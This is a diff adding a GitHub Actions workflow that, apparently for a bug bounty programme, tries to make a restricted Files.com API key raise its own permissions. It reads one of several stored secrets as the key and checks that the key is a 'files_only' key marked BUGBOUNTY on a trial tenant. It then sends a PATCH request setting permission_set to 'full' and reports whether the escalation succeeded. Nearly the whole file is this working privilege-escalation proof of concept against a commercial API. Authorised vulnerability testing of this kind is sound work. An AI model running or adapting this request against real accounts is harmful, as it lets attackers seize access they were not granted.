@@ -1,0 +1,85 @@
+name: Files.com API Key Self-Escalation Test
+
+on:
+  push:
+    paths:
+      - ".github/workflows/files-api-key-self-escalation.yml"
+  workflow_dispatch:
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    timeout-minutes: 3
+    env:
+      BASE: https://bugbountytrialcompany1219.files.com
+      K1: ${{ secrets.FILES_API_KEY }}
+      K2: ${{ secrets.FILESCOM_API_KEY }}
+      K3: ${{ secrets.H1_FILES_API_KEY }}
+      K4: ${{ secrets.BUGBOUNTY_FILES_API_KEY }}
+      K5: ${{ secrets.FILESCOM_BUGBOUNTY_API_KEY }}
+    steps:
+      - name: Test restricted API key self-escalation
+        shell: bash
+        run: |
+          set -euo pipefail
+          set +x
+
+          key=""
+          for candidate in "$K1" "$K2" "$K3" "$K4" "$K5"; do
+            if [ -n "$candidate" ]; then
+              key="$candidate"
+              break
+            fi
+          done
+
+          if [ -z "$key" ]; then
+            echo "NO_TEST_KEY_SECRET_CONFIGURED"
+            exit 0
+          fi
+
+          rm -f /tmp/key.json /tmp/key-patch.json
+          code=$(curl -sS --max-time 15 --max-redirs 0             -H "X-FilesAPI-Key: $key"             -H "Accept: application/json"             -o /tmp/key.json -w "%{http_code}"             "$BASE/api/rest/v1/api_key.json")
+          python3 - <<'PY'
+          import json
+          p=json.load(open("/tmp/key.json"))
+          print("AUTH_STATUS=" + __import__("os").environ.get("CODE",""))
+          print("KEY_NAME=" + str(p.get("name","")))
+          print("KEY_PERMISSION_SET=" + str(p.get("permission_set","")))
+          print("KEY_USER_ID=" + str(p.get("user_id","")))
+          print("KEY_WORKSPACE_ID=" + str(p.get("workspace_id","")))
+          PY
+
+          if [ "$code" != "200" ]; then
+            echo "KEY_AUTHENTICATION_DID_NOT_RETURN_200"
+            rm -f /tmp/key.json
+            exit 0
+          fi
+
+          name=$(python3 -c 'import json; print(json.load(open("/tmp/key.json")).get("name",""))')
+          permission=$(python3 -c 'import json; print(json.load(open("/tmp/key.json")).get("permission_set",""))')
+          rm -f /tmp/key.json
+
+          case "$name" in
+            *BUGBOUNTY*) ;;
+            *) echo "KEY_IS_NOT_MARKED_AS_BUGBOUNTY_TEST_KEY"; exit 0 ;;
+          esac
+
+          if [ "$permission" != "files_only" ]; then
+            echo "TEST_KEY_IS_NOT_FILES_ONLY_CURRENTLY"
+            exit 0
+          fi
+
+          payload='{"permission_set":"full","name":"BUGBOUNTY-AUTHZ-ESCALATION-TEST"}'
+          patch_code=$(curl -sS --max-time 15 --max-redirs 0             -X PATCH             -H "X-FilesAPI-Key: $key"             -H "Content-Type: application/json"             -H "Accept: application/json"             -d "$payload"             -o /tmp/key-patch.json -w "%{http_code}"             "$BASE/api/rest/v1/api_key.json")
+
+          new_permission=$(python3 -c 'import json; p=json.load(open("/tmp/key-patch.json")); print(p.get("permission_set",""))' 2>/dev/null || true)
+          echo "PATCH_STATUS=$patch_code"
+          echo "RESULTING_PERMISSION_SET=$new_permission"
+
+          if [ "$patch_code" -ge 200 ] && [ "$patch_code" -lt 300 ] && [ "$new_permission" = "full" ]; then
+            echo "CONFIRMED_API_KEY_SELF_ESCALATION"
+            exit 42
+          fi
+
+          echo "NO_API_KEY_SELF_ESCALATION_CONFIRMED"
+          rm -f /tmp/key-patch.json
